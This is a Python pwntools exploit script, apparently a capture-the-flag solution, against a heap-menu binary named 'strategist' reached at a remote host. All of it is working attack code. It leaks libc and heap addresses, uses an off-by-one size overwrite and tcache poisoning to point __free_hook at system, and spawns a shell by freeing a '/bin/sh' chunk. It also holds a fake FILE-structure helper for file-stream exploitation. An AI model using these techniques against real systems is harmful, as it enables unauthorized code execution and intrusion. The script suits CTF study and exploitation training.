#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './strategist'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.60.63', 53078

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def malloc(size, value):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("> ", str(size).encode())
    io.sendafter("> ", value)

def show(idx):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("> ", str(idx).encode())

def edit(idx, value):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("> ", str(idx).encode())
    io.sendafter("> ", value)

def free(idx):
    io.sendlineafter("> ", b"4")
    io.sendlineafter("> ", str(idx).encode())

def onegadget():
    try:
        result = process(["one_gadget", "-r", "-l", "30", "libc.so.6"])
        output = result.recvline().decode().strip().split(" ")
        result.close()
        one_gadget = [int(addr) for addr in output]
        return one_gadget
    except Exception as e:
        print(f"Error running one_gadget: {e}")
        return []

def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=0):
    global heap
    fs = FileStructure()   
    fs.flags = b"  sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp 
    fs._lock = fp+0x100 
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset   
    return bytes(fs)

def exploit():
    global io, heap
    #   one_gadget = onegadget()
    io = initialize()
    with log.progress("Leaking libc & heap"), context.silent:
        malloc(0x428, b"A")
        malloc(0x18, b"B")
        malloc(0x18, b"C")
        free(0)
        malloc(0x428, b"Z")
        free(1)
        free(2)
        show(0)
        io.recvuntil(b"Z")
        libc_leak = u64(io.recvline().strip().ljust(8, b"\x00")) << 8
        libc.address = libc_leak - 0x3ebc00
        malloc(0x18, b"Z")
        show(1)
        io.recvuntil(b"Z")
        heap = u64(io.recvline().strip().ljust(8, b"\x00")) << 12
        malloc(0x18, b"Z")
    log.info("Heap: %#x", heap)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    with log.progress("Hijacking __free_hook"), context.silent:
        malloc(0x18, b"Z"*0x18) # 3
        malloc(0x18, b"Z"*0x18) # 4
        malloc(0x18, b"Z"*0x18) # 5
        malloc(0x18, b"Z"*0x18) # 6
        malloc(0x18, b"/bin/sh\0") # 7
        edit(3, b"Z"*0x18 + p8(0x41)) # 3
        free(4)
        free(6)
        free(5)
        malloc(0x38, b"Z"*0x18 + p64(0x21) + p64(libc.sym["__free_hook"])) # 4
        malloc(0x18, b"Z"*0x18) # 5
        malloc(0x18, p64(libc.sym["system"])) # 6
        free(7)
    io.interactive()

if __name__ == '__main__':
    exploit()
